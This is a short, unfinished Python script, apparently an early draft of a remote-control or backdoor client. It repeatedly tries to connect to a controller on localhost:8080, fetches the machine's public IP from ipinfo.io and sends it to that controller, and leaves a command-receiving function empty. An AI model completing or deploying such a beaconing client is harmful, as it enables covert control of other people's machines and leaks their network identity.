import socket
import requests

HOST = "localhost"
PORT = 8080

def tryConnection():
    global client
    while True:
        try:
            print("tento la connessione")
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((HOST, PORT))
            getIp()
            receiveCommand()
        except:
            try:
                client.close()
            except:
                pass

def getIp():
    url = "https://ipinfo.io/json"
    req = requests.get(url)
    ip = req.json()["ip"]
    client.send(str(ip).encode())
    while True:
        pass


def receiveCommand():
    pass

if __name__ == "__main__":
    tryConnection()